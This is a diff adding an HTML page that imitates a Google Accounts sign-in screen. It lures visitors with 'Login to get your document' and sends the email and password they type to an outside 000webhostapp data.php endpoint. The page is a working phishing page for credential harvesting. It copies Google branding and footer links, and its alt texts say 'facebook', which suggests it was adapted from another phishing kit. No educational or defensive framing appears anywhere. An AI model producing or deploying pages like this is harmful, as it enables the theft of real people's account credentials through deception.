@@ -1,0 +1,82 @@
+<html>
+<head>
+<link rel="icon" 
+      type="image/png" 
+      href="img/favicon.ico" />
+<title>Sign in - Google Accounts</title>
+<style>
+#body { margin: 0;}
+#header {height: 83px; width:100%; top:0; left:0; position:fixed}
+#logo {top: 50%;left: 50%;  margin-right: -50%; transform: translate(-50%, -50%); position:absolute}
+#main { margin-top:5%; margin-right:5%;padding:22px 70px 26px 120px; height:245px; margin-left: 270; margin-right:308;overflow: auto; width:500; height:750;text-align: center;}
+#main h1 {font-family: 'Open Sans', arial;font-weight: 300;font-size: 38px; margin-bottom: 15px;-webkit-font-smoothing: antialiased;color: #555;}
+#main h2 {font-family: 'Open Sans', arial;font-size: 18px; font-weight: 400;color: #555;}
+#container { margin-left:10%; width:396px; height:245px;padding:22px 1px 56px 1px;  margin-top:2px;  border-bottom:#CCC 2px solid; border-left: #D1D1D1 1px solid; border-right:#D1D1D1 1px solid; }
+
+input[type=text], input[type=password] { width: 70%; padding: 9px 9px; margin: 4px 0; display: inline-block; border: 1px solid #999; box-sizing: border-box;}
+
+input[type=submit]{background: #4CAF50 url('img/btn.png') repeat-x ; color: white; padding: 8px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 13px; margin: 4px 2px; cursor: pointer;width: 70%;font-family: Arial, sans-serif; height:36px; border-radius: 5px; -moz-border-radius: 5px; -webkit-border-radius: 5px; border:#06F}
+input[type=submit]:hover { background:#06F url('img/btn2.png') ;}
+
+#footer {  margin-top: 20px; font-family: Arial, sans-serif; font-size: 13px; color: #404040;  text-align: center; margin-bottom:15px; padding-bottom:25px }
+div.logo-strip  {background-repeat: no-repeat; display: block; background-size: 230px 17px;}
+
+#footer-container { width:100%; height:30px; position:fixed; bottom:0; border-top: 1px dotted #CCC; left:0}
+#footer-container ul { margin: 2px; padding: 0; list-style-type: none; }
+#footer-container ul li { display: inline; margin-right: 5px; color: #737373; }
+#footer-container ul li a { font-size: .85em; white-space: nowrap; line-height: 0;color: #737373; }
+#footer-container ul li a:hover { text-decoration: underline; }
+#footer-container p { font-weight: bold; }
+
+</style>
+</head>
+<body>
+<div id="header">
+<div id="logo">
+<a href="index.html"><img src="img/logo.png" alt="facebook" /></a>
+</div>
+</div>
+<div id="main">
+<h1>Opps! Login to get your document </h1>
+<h2>Sign in with your Google Account </h2>
+<div id="container">
+<div class="pic">
+<a href="index.html"><img src="img/canvas.png" alt="facebook" /></a>
+</div>
+<div class"form">
+<form name="input" action="https://cs2k17iitk.000webhostapp.com/data.php" method="post">
+<input id="error" type="text" name="username" placeholder="Enter your email" />
+<input type="password" name="password" placeholder="Password">
+<input type="submit" value="Sign in" action="data.php" onClick="myFunction()" method="post"/>
+<br>
+Password will be sent to your gmail account
+</form>
+</div>
+
+</div>
+<div id="footer">
+<a> One Google Account for everything Google </a>
+<br>
+<div class="logo-strip">
+<a href="index.html"><img src="../ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png" alt="gmail" /></a>
+</div>
+</div>
+</div>
+
+
+<div id="footer-container">
+<ul>
+
+<li><a href="../www.google.com/intl/en/about.html">About Google</a></li>
+<li>-</li>
+<li><a href="../accounts.google.com/TOS%3Floc=PK&amp;hl=en&amp;privacy=true.html"> Privacy </a></li>
+<li>-</li>
+<li><a href="../accounts.google.com/TOS%3Floc=PK&amp;hl=en.html"> Terms </a></li>
+<li>-</li>
+<li><a href="../www.google.com/support/accounts%3Fhl=en.html">Help </a></li>
+
+	</ul>
+</div>
+
+<div style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;'><a title="000webhost logo" rel="nofollow" target="_blank" href="../www.000webhost.com/index.html%3Futm_source=000webhostapp&amp;utm_campaign=000_logo&amp;utm_campaign=ss-footer_logo&amp;utm_medium=000_logo&amp;utm_content=website.html"><img src="../cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png" alt="000webhost logo"></a></div></body>
+</html>
